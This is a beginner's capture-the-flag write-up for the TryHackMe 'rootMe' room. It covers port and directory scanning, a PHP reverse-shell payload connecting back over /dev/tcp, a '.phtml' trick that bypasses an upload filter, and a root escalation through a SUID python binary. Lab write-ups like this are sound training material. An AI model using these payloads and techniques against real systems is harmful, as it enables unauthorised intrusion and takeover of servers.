---
layout: writeup
title: "TryHackMe Challenge: rootMe"
description: "A ctf for beginners, can you root me?"
difficulty: medium
event: "TryHackMe"
tags: [reconnaissance, web]
date: 2025-06-09
---

## Challenge Overview:
- The following was the description for the challenge:
    ![stepic challenge](/assets/img/rootMe(1).PNG){: .writeup-image }

## Questions:
1. Reconnaissance:
    ![stepic challenge](/assets/img/rootMe(2).PNG){: .writeup-image }
    - 2nd part of Question 1:
    ![stepic challenge](/assets/img/rootMe(3).PNG){: .writeup-image }


2. Getting a Shell:
    ![stepic challenge](/assets/img/rootMe(4).PNG){: .writeup-image }


3. Privilege Escalation:
    ![stepic challenge](/assets/img/rootMe(5).PNG){: .writeup-image }

---

## Reconnaissance:
![stepic challenge](/assets/img/rootMe(6).PNG){: .writeup-image }
- Nmap(Network Mapper) is a tool used for network discovery and security auditing
    ```bash
    nmap -p- -open -T4 -v 10.10.220.16
    ```
    - Note that for the ip address, you will get a different address.
    - `-p-` : Scans all the ports.
    - `-open` : Only the ports that are open.
    - `-T4` : Use this if you have a stable network, it speeds up the process.
    - `-v` : "verbose"(optional), used to show more details.
- Hence, there are two(2) ports that are open😀.

### Apache Version:
![stepic challenge](/assets/img/rootMe(7).PNG){: .writeup-image }
- Apache HTTP Server, is a commonly used web server.
    ```bash
    nmap -sV -T4 10.10.220.16
    ```
    - `-sV` : Service and Version.
- The version of the Apache is the one highlighted.

### Service running in port 22?
![stepic challenge](/assets/img/rootMe(8).PNG){: .writeup-image }
- SSH has one of the common ports.
- It assigned port 22 by default.
- So the answer would have been intuitive

### Hidden Directory
![stepic challenge](/assets/img/rootMe(9).PNG){: .writeup-image }
- Wordlist choice, there are many wordlist that you can use. But, i have went for that one.
- But if you want to use that one as well then just:
    ```bash
    locate directory-list
    ```
    - This will show all the available wordlist.
    - Then from there, we execute our gobuster tool:
    ```bash
    gobuster dir -u http://10.10.220.16 -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt -t 50 -q
    ```
        - `-u`: Website that you wish to perform the scan(It is important that you use the "http://").
        - `-w`: wordlist
        - `-t`: Number of threads, this just corresponds to "speed" at which the scan will be performed, the most maximum that is recommended is 100.
        - `-q`: quite
        - The following is the homepage of the website:
    ![stepic challenge](/assets/img/rootMe(10).PNG){: .writeup-image }
    - As you can see, there is no any button that takes you to the panel page, and this implies that you have to navigate manually from the URL to navigate to the panel page:
    ![stepic challenge](/assets/img/rootMe(11).PNG){: .writeup-image }
    - This makes it the hidden directory.

## Getting a Shell:
- A remote shell is a command-line interface that allows you execute commands on a remote server/device. It is really a powerful skill to have:
    - There many ways to get a shell, but the following approach is how i have learned through previous ctf challenges:
    - Okay, but honestly i struggled a lot with this one though i thought it was gonna be easy and it was after an intensive research that i finally found out about the new extention. But let's go through it together and i will show you how i struggled if you want to know.
    - Firstly, i knew how to write the php shell code, which is as follows:
    ```php
    <?php 
        $ip=***.***.***.***;
        $port=****;
        shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
    ?>
    ```
    - I know this might not be intuitive, but trust me the more you do the ctf challenges, the more this will stick in your brain.
    - But to describe it a little:
        - `shell_exec("")`:This is just a system function that tells the system to execute the provided commands.
        - `/bin/bash`: Path to the bash executable, basically a command-line intepreter(converts the code/commands to machine code), used for executing shell scripts. 
        - `-i`: "interactive", allows us to get an interactive shell.
        - `&> /dev/tcp/$ip/$port`: This just establishes a connection "tcp tunnel" between you and the server.
        - `0>&1`: This is just for input-output, allows us to input and get an output.
😬, but there is more detailed complex information about that payload.
    - So the objective is that we have to find a vulnerability within this website.
    - Immediately i though of the "Arbitrary File Upload" vulnerability. It when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type and extensions.
    - When can easily upload a php file, that web server will execute to give us a shell. But in this case its not that easy.
    - So then i created the php file:
    ![stepic challenge](/assets/img/rootMe(11).PNG){: .writeup-image }
    - Preference(Sublime-text editor), you may use any that you comforatable with.
    - I have already explained the payload above.
    - But for the `port` you may use any port that is not in-use, the most common one is 1337.
    - Initially i saved the file as `.php`, and when i uploaded the file i got the error below. 
        ![stepic challenge](/assets/img/rootMe(13).PNG){: .writeup-image }
        - We do not even have to translate, it's clear that the `php` extension is not permitted.
        - We have to bypass that restriction. Hence, i this time around i saved the file as `php.txt`.
        ![stepic challenge](/assets/img/rootMe(14).PNG){: .writeup-image }
        - It was successfully uploaded. But as you can see below that, we not getting our reverse shell.
        ![stepic challenge](/assets/img/rootMe(15).PNG){: .writeup-image }
        - After many attempts, of changing the code and the extension, i finnaly discovered about this extension `.phtml`.This extension tells the server that the file has a combination of html and php code. 
        ![stepic challenge](/assets/img/rootMe(16).PNG){: .writeup-image }
        - Thus i was able to get a shell.
    ![stepic challenge](/assets/img/rootMe(17).PNG){: .writeup-image }
        - The highlighted command is as follows:
        ```bash
        find / -type f -name "user.txt"
        ```
        - `find`: It just finds what you want.
        - `/`: This is the root directory, and we tell it to look all files from the root directory.
        - `f`: file.
        - `-name`: The name of the file.
        - `""`: The pattern.
        - Alternatively, for a cleaner output
        ```
        find / -type f -name "user.txt" 2>/dev/null
        ```
        - This will give you the output straight, without the all the errors shown.
        - `2>/dev/null`: All i know is that the 2, represent the errors, and you redirect them to the specified directory. Meaning it will give only what you are looking for, for which in this case will be `/var/www/user.txt`.
        - But i used the first command, which means you have to scroll up, until you find the directory without the `permission denied`. <br>
    ![stepic challenge](/assets/img/rootMe(18).PNG){: .writeup-image }
        - Then look at the contents:
    ![stepic challenge](/assets/img/rootMe(19).PNG){: .writeup-image }
        - With the following highlighted command:
        ```bash
        cat /var/www/user.txt
        ```
        - `cat`: used to view the contents of the file.

## Privilege Escalation through SUID(set user ID):
- Main objective, is to get a shell as a root.
- The following command is used to search for files that require being executed as a root.
- I forgot to highlight but, i will show the code below.
    ![stepic challenge](/assets/img/rootMe(20).PNG){: .writeup-image }
    - command:
    ```bash
    find / -type f -user root -perm -4000 2>/dev/null
    ```
        - `-user`: A user can be as a root or group or as department.
        - `-perm`: short for permission.
        - `4000`: refers to the SUID. <br>

**Weird File?**
- `/usr/bin/python`
    - This is because python is just an intepreter, there is literally no or was no need to use it as a root.
    - You can use python even if, you are not as root.
    - Hence, we can use this to our advantage to get ourselves a root shell.

**Escalating our privileges:**
- Initially i tried with this python code, and i still do not understand why it is not working
    ```python
    /usr/bin/python -c 'import os; os.system("/bin/sh")'
    ```
    ![stepic challenge](/assets/img/rootMe(25).PNG){: .writeup-image }
    - I was able to get a shell but not as root.
    - The following command helps to see if you are root or not:
    ```bash
    whoami
    ```
- But then i went to our typical website: [GTFOBins](https://gtfobins.github.io/)
    ![stepic challenge](/assets/img/rootMe(22).PNG){: .writeup-image }
    - It is simple you just type python+suid. Then you should get the following:
    ![stepic challenge](/assets/img/rootMe(23).PNG){: .writeup-image }
    - You can copy and paste.
    - Otherwise(in this case):
    ```python
    /usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'
    ```
        - `-c`: Tells python to execute the following code directly.
        - `import os`: Library for system operations.
        - `os.execl()`: Replaces the current process (python) with the new one (/bin/sh)
        - `sh`: The program name(abitrary).
        - `-p`: Makes the shell *preserve privileges*. <br>
    - The following highlighted are the commands.
![stepic challenge](/assets/img/rootMe(24).PNG){: .writeup-image }
       








     



         

     









    
